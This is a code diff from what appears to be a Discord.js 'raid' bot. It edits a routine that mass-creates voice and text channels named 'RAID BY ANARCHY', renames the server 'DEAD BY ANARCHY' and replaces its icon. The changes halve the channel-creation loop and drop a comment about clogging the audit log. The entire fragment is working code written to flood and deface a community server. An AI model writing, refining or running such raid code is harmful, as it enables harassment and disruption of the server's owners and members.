@@ -10,12 +10,15 @@ const Discord = require('discord.js');
                     color: 'RED',
                 });
               }
-                for (var i = 0; i < 500; i++) {
+                for (var i = 0; i < 250; i++) {
                 message.guild.createChannel('RAID BY ANARCHY', 'voice')
                 message.guild.createChannel('RAID BY ANARCHY', 'text')
-                //changes name tons of times to clog up the audit log
-                message.guild.setName("DEAD BY ANARCHY");
+    
+          
                 }
+    
+    message.guild.setName("DEAD BY ANARCHY");
+    message.guild.setIcon("https://cdn.discordapp.com/icons/498502361526829066/3a3d7943bf5c012064da45516b9ee279.webp")
             };
 
 
